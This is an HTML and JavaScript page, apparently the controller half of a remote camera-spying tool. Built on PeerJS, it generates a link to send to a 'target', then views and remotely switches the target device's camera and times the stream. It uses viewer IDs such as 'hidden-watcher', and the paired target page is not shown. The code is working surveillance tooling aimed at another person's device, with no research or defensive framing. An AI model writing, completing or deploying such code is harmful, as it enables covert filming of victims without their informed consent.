<!DOCTYPE html>
<html>
<head>
    <title>Remote Camera Controller</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a2980, #26d0ce);
            color: white;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
        }
        
        header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid rgba(255, 255, 255, 0.1);
        }
        
        h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            background: linear-gradient(to right, #00b4db, #0083b0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .control-panel {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
            backdrop-filter: blur(10px);
        }
        
        .video-container {
            position: relative;
            width: 100%;
            background: #000;
            border-radius: 15px;
            overflow: hidden;
            margin-bottom: 25px;
            aspect-ratio: 16/9;
        }
        
        #remoteVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .no-signal {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            color: #666;
            font-size: 1.2em;
        }
        
        .controls {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }
        
        button {
            padding: 18px;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 7px 15px rgba(0, 0, 0, 0.3);
        }
        
        button:active {
            transform: translateY(1px);
        }
        
        #btnStart {
            background: linear-gradient(to right, #00b09b, #96c93d);
            color: white;
        }
        
        #btnStop {
            background: linear-gradient(to right, #ff416c, #ff4b2b);
            color: white;
        }
        
        #btnSwitchCam {
            background: linear-gradient(to right, #8e2de2, #4a00e0);
            color: white;
        }
        
        #btnCopyLink {
            background: linear-gradient(to right, #f7971e, #ffd200);
            color: black;
        }
        
        .status-indicator {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 15px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 10px;
            margin-bottom: 20px;
        }
        
        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #ff4757;
        }
        
        .status-dot.active {
            background: #2ed573;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .info-box {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
        }
        
        .info-box h3 {
            margin-bottom: 15px;
            color: #00b4db;
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
        }
        
        .info-item {
            background: rgba(255, 255, 255, 0.03);
            padding: 12px;
            border-radius: 8px;
            border-left: 4px solid #00b4db;
        }
        
        .info-label {
            font-size: 0.9em;
            color: #aaa;
            margin-bottom: 5px;
        }
        
        .info-value {
            font-size: 1.1em;
            font-weight: bold;
            word-break: break-all;
        }
        
        #connectionLink {
            background: rgba(0, 0, 0, 0.5);
            padding: 15px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 0.9em;
            word-break: break-all;
            margin: 15px 0;
            border: 1px dashed #444;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.9);
            color: white;
            padding: 15px 25px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
            transform: translateX(150%);
            transition: transform 0.3s ease;
            z-index: 1000;
            border-left: 5px solid #00b4db;
        }
        
        .notification.show {
            transform: translateX(0);
        }
        
        .camera-badge {
            position: absolute;
            top: 15px;
            left: 15px;
            background: rgba(0, 0, 0, 0.7);
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 0.9em;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }
            
            .controls {
                grid-template-columns: 1fr;
            }
            
            button {
                padding: 20px;
            }
            
            h1 {
                font-size: 2em;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎥 Remote Camera Controller</h1>
            <p>Full control over remote camera streaming</p>
        </header>
        
        <div class="status-indicator">
            <div class="status-dot" id="statusDot"></div>
            <span id="statusText">Disconnected</span>
        </div>
        
        <div class="control-panel">
            <div class="controls">
                <button id="btnStart">
                    <span>▶️</span> START STREAM
                </button>
                <button id="btnStop" disabled>
                    <span>⏹️</span> STOP STREAM
                </button>
                <button id="btnSwitchCam" disabled>
                    <span>🔄</span> SWITCH CAMERA
                </button>
                <button id="btnCopyLink">
                    <span>🔗</span> COPY LINK
                </button>
            </div>
            
            <div id="linkSection" style="display: none;">
                <p>Send this link to target:</p>
                <div id="connectionLink">Generating link...</div>
            </div>
        </div>
        
        <div class="video-container">
            <video id="remoteVideo" autoplay playsinline></video>
            <div class="no-signal" id="noSignal">
                📹 NO SIGNAL<br>
                <small>Start stream to view camera</small>
            </div>
            <div class="camera-badge" id="cameraBadge" style="display: none;">
                📷 <span id="cameraType">Back Camera</span>
            </div>
        </div>
        
        <div class="info-box">
            <h3>📊 Stream Information</h3>
            <div class="info-grid">
                <div class="info-item">
                    <div class="info-label">Your ID</div>
                    <div class="info-value" id="viewerIdValue">-</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Target ID</div>
                    <div class="info-value" id="targetIdValue">-</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Connection Status</div>
                    <div class="info-value" id="connectionStatus">Disconnected</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Stream Duration</div>
                    <div class="info-value" id="streamDuration">00:00:00</div>
                </div>
            </div>
        </div>
    </div>
    
    <div class="notification" id="notification">
        <div id="notificationText"></div>
    </div>

    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script>
        // State variables
        let peer = null;
        let conn = null;
        let activeCall = null;
        let remoteStream = null;
        let viewerId = null;
        let targetId = null;
        let streamStartTime = null;
        let streamTimer = null;
        let currentCameraType = 'back';
        
        // DOM Elements
        const remoteVideo = document.getElementById('remoteVideo');
        const noSignal = document.getElementById('noSignal');
        const cameraBadge = document.getElementById('cameraBadge');
        const cameraTypeSpan = document.getElementById('cameraType');
        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        const viewerIdValue = document.getElementById('viewerIdValue');
        const targetIdValue = document.getElementById('targetIdValue');
        const connectionStatus = document.getElementById('connectionStatus');
        const streamDuration = document.getElementById('streamDuration');
        const connectionLink = document.getElementById('connectionLink');
        const linkSection = document.getElementById('linkSection');
        const notification = document.getElementById('notification');
        const notificationText = document.getElementById('notificationText');
        
        // Buttons
        const btnStart = document.getElementById('btnStart');
        const btnStop = document.getElementById('btnStop');
        const btnSwitchCam = document.getElementById('btnSwitchCam');
        const btnCopyLink = document.getElementById('btnCopyLink');
        
        // PeerJS Configuration
        const PEER_CONFIG = {
            host: '0.peerjs.com',
            port: 443,
            secure: true,
            pingInterval: 5000
        };
        
        // Generate viewer ID
        function generateViewerId() {
            const adjectives = ['silent', 'hidden', 'remote', 'digital', 'virtual'];
            const nouns = ['observer', 'watcher', 'viewer', 'monitor', 'controller'];
            const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
            const noun = nouns[Math.floor(Math.random() * nouns.length)];
            const num = Math.floor(1000 + Math.random() * 9000);
            return `${adj}-${noun}-${num}`;
        }
        
        // Show notification
        function showNotification(message, duration = 3000) {
            notificationText.textContent = message;
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, duration);
        }
        
        // Update status
        function updateStatus(status, isConnected = false) {
            statusText.textContent = status;
            connectionStatus.textContent = status;
            statusDot.className = 'status-dot' + (isConnected ? ' active' : '');
        }
        
        // Update stream timer
        function updateStreamTimer() {
            if (!streamStartTime) return;
            
            const now = new Date();
            const diff = Math.floor((now - streamStartTime) / 1000);
            
            const hours = Math.floor(diff / 3600);
            const minutes = Math.floor((diff % 3600) / 60);
            const seconds = diff % 60;
            
            streamDuration.textContent = 
                `${hours.toString().padStart(2, '0')}:` +
                `${minutes.toString().padStart(2, '0')}:` +
                `${seconds.toString().padStart(2, '0')}`;
        }
        
        // Initialize Peer
        function initPeer() {
            viewerId = generateViewerId();
            peer = new Peer(viewerId, PEER_CONFIG);
            
            peer.on('open', (id) => {
                viewerIdValue.textContent = id;
                updateStatus('Ready to connect', false);
                btnStart.disabled = false;
                
                // Generate and show link
                const baseUrl = window.location.href.replace(/\/[^\/]*$/, '');
                const targetUrl = `${baseUrl}/target.html?viewer=${id}`;
                connectionLink.textContent = targetUrl;
                linkSection.style.display = 'block';
                
                showNotification(`Your ID: ${id}`);
            });
            
            peer.on('connection', (connection) => {
                conn = connection;
                targetId = connection.peer;
                targetIdValue.textContent = targetId;
                setupDataConnection();
                showNotification(`Target connected: ${targetId}`);
            });
            
            peer.on('call', (call) => {
                activeCall = call;
                call.answer(); // Accept call even without local stream
                
                call.on('stream', (stream) => {
                    remoteStream = stream;
                    remoteVideo.srcObject = stream;
                    noSignal.style.display = 'none';
                    cameraBadge.style.display = 'flex';
                    
                    // Start stream timer
                    streamStartTime = new Date();
                    streamTimer = setInterval(updateStreamTimer, 1000);
                    
                    updateStatus('Streaming active', true);
                    btnStop.disabled = false;
                    btnSwitchCam.disabled = false;
                    
                    showNotification('Stream started successfully');
                });
                
                call.on('close', () => {
                    stopStream();
                    showNotification('Stream closed by target');
                });
            });
            
            peer.on('error', (err) => {
                console.error('Peer error:', err);
                showNotification(`Error: ${err.type}`, 5000);
                updateStatus(`Error: ${err.type}`, false);
            });
        }
        
        // Setup data connection
        function setupDataConnection() {
            if (!conn) return;
            
            conn.on('open', () => {
                updateStatus('Connected to target', true);
            });
            
            conn.on('data', (data) => {
                console.log('Data from target:', data);
                
                if (data.type === 'target_ready') {
                    targetId = data.targetId;
                    targetIdValue.textContent = targetId;
                    
                    // Initiate video call
                    setTimeout(() => {
                        initiateVideoCall();
                    }, 1000);
                } else if (data.type === 'camera_switched') {
                    currentCameraType = data.camera.includes('Задняя') ? 'back' : 'front';
                    cameraTypeSpan.textContent = currentCameraType === 'back' ? 'Back Camera' : 'Front Camera';
                    showNotification(`Camera switched to ${currentCameraType}`);
                } else if (data.type === 'pong') {
                    // Ping response, connection is alive
                }
            });
            
            conn.on('close', () => {
                stopStream();
                showNotification('Target disconnected');
            });
        }
        
        // Initiate video call
        function initiateVideoCall() {
            if (!targetId || !peer) return;
            
            const call = peer.call(targetId, null);
            activeCall = call;
            
            call.on('stream', (stream) => {
                remoteStream = stream;
                remoteVideo.srcObject = stream;
                noSignal.style.display = 'none';
                cameraBadge.style.display = 'flex';
                
                // Start stream timer
                streamStartTime = new Date();
                streamTimer = setInterval(updateStreamTimer, 1000);
                
                updateStatus('Streaming active', true);
                btnStop.disabled = false;
                btnSwitchCam.disabled = false;
                
                showNotification('Stream started');
            });
            
            call.on('close', () => {
                stopStream();
            });
            
            call.on('error', (err) => {
                console.error('Call error:', err);
                showNotification('Call error: ' + err.message, 5000);
            });
        }
        
        // Start stream
        function startStream() {
            if (!peer) {
                initPeer();
            }
            
            updateStatus('Waiting for target...', false);
            btnStart.disabled = true;
            showNotification('Send the link to target device');
        }
        
        // Stop stream
        function stopStream() {
            if (activeCall) {
                activeCall.close();
                activeCall = null;
            }
            
            if (remoteStream) {
                remoteStream.getTracks().forEach(track => track.stop());
                remoteStream = null;
            }
            
            if (remoteVideo.srcObject) {
                remoteVideo.srcObject = null;
            }
            
            noSignal.style.display = 'block';
            cameraBadge.style.display = 'none';
            
            if (streamTimer) {
                clearInterval(streamTimer);
                streamTimer = null;
            }
            
            streamStartTime = null;
            streamDuration.textContent = '00:00:00';
            
            updateStatus('Disconnected', false);
            btnStart.disabled = false;
            btnStop.disabled = true;
            btnSwitchCam.disabled = true;
            
            // Send disconnect command to target
            if (conn && conn.open) {
                conn.send({ type: 'disconnect' });
            }
            
            showNotification('Stream stopped');
        }
        
        // Switch camera
        function switchCamera() {
            if (!conn || !conn.open) {
                showNotification('No connection to target', 3000);
                return;
            }
            
            conn.send({
                type: 'switch_camera',
                timestamp: Date.now()
            });
            
            showNotification('Switching camera...');
        }
        
        // Copy link to clipboard
        function copyLinkToClipboard() {
            const link = connectionLink.textContent;
            
            navigator.clipboard.writeText(link).then(() => {
                showNotification('Link copied to clipboard!', 2000);
            }).catch(err => {
                console.error('Copy failed:', err);
                showNotification('Failed to copy link', 3000);
            });
        }
        
        // Event listeners
        btnStart.addEventListener('click', startStream);
        btnStop.addEventListener('click', stopStream);
        btnSwitchCam.addEventListener('click', switchCamera);
        btnCopyLink.addEventListener('click', copyLinkToClipboard);
        
        // Initialize on load
        window.addEventListener('load', () => {
            initPeer();
        });
        
        // Handle page visibility change
        document.addEventListener('visibilitychange', () => {
            if (document.hidden && remoteStream) {
                showNotification('Stream continues in background');
            }
        });
    </script>
</body>
</html>
